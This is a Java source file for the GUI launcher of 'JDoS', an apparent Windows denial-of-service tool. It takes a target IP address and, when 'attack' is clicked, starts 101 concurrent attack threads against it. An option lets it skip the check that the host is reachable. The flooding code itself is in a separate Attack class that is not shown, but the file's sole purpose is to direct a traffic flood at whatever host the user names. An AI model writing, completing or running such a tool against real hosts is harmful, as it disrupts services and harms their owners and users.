package jdos.exploitr;

import javax.swing.*;
import java.awt.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by ExploiTR on 14-Jun-17
 *
 * Main Class Contains Information Gathering Methods.
 *
 *
 * ONLY FOR WINDOWS
 *
 * Update : Ignore IP Checking Option
 */

public class StartAttack {


    public JPanel mainPanel;
    private JTextField ipadress;
    private JButton attack;
    private JButton stopAttack;
    private JCheckBox ignoreResponseCheckBox;

    private StartAttack() {
        attack.addActionListener(ex -> {
            if (!ipadress.getText().isEmpty()) {
                if(!ignoreResponseCheckBox.isSelected()){
                    if (new Attack(ipadress.getText()).checkIP()) {
                        ExecutorService executor = Executors.newFixedThreadPool(100);

                        for (int i = 0; i < 101; i++) {
                            Runnable worker = new Attack(ipadress.getText());
                            executor.execute(worker);
                            stopAttack.setVisible(true);
                            stopAttack.addActionListener(e -> closeit());
                        }
                    } else {
                        JOptionPane.showMessageDialog(new StartAttack().mainPanel,
                                "Can't Reach IP Address", "Is he alive?", JOptionPane.ERROR_MESSAGE);
                    }
                }else{
                    ExecutorService executor = Executors.newFixedThreadPool(100);

                    for (int i = 0; i < 101; i++) {
                        Runnable worker = new Attack(ipadress.getText());
                        executor.execute(worker);
                        stopAttack.setVisible(true);
                        stopAttack.addActionListener(e -> closeit());
                    }
                }
            } else {
                JOptionPane.showMessageDialog(new StartAttack().mainPanel,
                        "Why need to throw a knife without an enemy?", "What?", JOptionPane.ERROR_MESSAGE);
            }
        });
        stopAttack.addActionListener(e -> System.exit(0));
    }

    public static void main(String[] args) {

        JFrame frame = new JFrame("JDoS");
        frame.setContentPane(new StartAttack().mainPanel);
        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        frame.setVisible(true);

        Insets insets = frame.getInsets();
        frame.setSize(new Dimension(insets.left + insets.right + 400, insets.top + insets.bottom + 200));
        frame.setResizable(false);

    }

    private void closeit() {
        new Attack(null).close();
    }

}
